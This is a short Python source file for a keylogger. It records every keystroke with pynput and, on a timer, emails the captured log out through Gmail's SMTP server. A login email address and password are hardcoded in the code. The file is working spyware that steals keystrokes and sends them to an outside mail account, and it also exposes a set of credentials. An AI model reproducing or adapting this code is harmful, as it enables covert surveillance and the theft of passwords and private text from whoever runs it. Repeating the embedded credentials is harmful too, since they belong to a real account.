import pynput.keyboard
import threading
import smtplib

class Keylogger:

    def __init__(self, time_interval):
        self.log = ""
        self.interval = time_interval

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):

        try:
            self.append_to_log(str(key.char))
        except:
            if key == key.space:
                self.append_to_log(" ")
            else:
                self.append_to_log(" " + str(key) + " ")
        print(self.log)

    def report(self):

        print(self.log)
        self.send_email("brigham.10.01@ucspe.edu.pe", "the best password.159", self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message) 
        server.quit()

    def ini(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
